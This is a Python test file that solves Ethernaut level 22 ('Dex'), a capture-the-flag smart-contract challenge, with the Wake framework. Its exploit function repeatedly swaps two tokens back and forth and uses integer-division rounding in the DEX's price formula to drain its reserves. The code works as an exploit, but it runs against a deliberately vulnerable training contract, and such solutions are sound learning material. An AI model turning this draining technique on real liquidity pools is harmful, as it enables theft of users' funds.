from wake.testing import *
from tests.ethernaut_deployer import EthernautDeployer
from pytypes.contracts.lv22_dex import Dex, SwappableToken
from typing import List

@default_chain.connect()
def test_lv22():
    ethernaut = EthernautDeployer(default_chain)
    contract = ethernaut.deploy_lv22()
    exploit_lv22(contract, ethernaut.attacker)
    ethernaut.check_lv22(contract)

def exploit_lv22(contract: Dex, attacker: Account):
    # Attack vector: inteeger division (rounding down in favor of the attacker)
    t1 = SwappableToken(contract.token1())
    t2 = SwappableToken(contract.token2())
    contract.approve(contract.address, 1000)

    resolver = DexTransactionResolver([t1, t2], contract, attacker)
    resolver.print_balances()

    for i in range(10):
        resolver.do_swap(t1, t2)
        resolver.do_swap(t2, t1)

class DexTransactionResolver:
    tokens: List[SwappableToken]
    dex: Dex
    attacker: Account

    def __init__(self, tokens: List[SwappableToken], dex: Dex, attacker: Account):
        self.tokens = tokens 
        self.dex = dex 
        self.attacker = attacker

    def do_swap(self, fromToken: SwappableToken, toToken: SwappableToken):
        attacker_tokens = fromToken.balanceOf(self.attacker.address)
        dex_tokens = fromToken.balanceOf(self.dex.address)
        amount = attacker_tokens if attacker_tokens < dex_tokens else dex_tokens
        if amount <= 0 or toToken.balanceOf(self.dex.address) == 0:
            return
        self.dex.swap(fromToken.address, toToken.address, amount)
        self.print_swap(fromToken, toToken, amount)

    def print_swap(self, fromToken: SwappableToken, toToken: SwappableToken, amount: int):
        print(f"Swapping:  {amount} ({fromToken.symbol()} -> {toToken.symbol()})")
        self.print_balances()

    def print_balances(self):
        self.print_balances_of(f"Dex:      ", self.dex)
        self.print_balances_of(f"Attacker: ", self.attacker)
        print()
    
    def print_balances_of(self, entity: str, address: Address):
        print(entity, end=" ")
        for token in self.tokens: print(f"{token.balanceOf(address)} {token.symbol()}", end="   ")
        print()
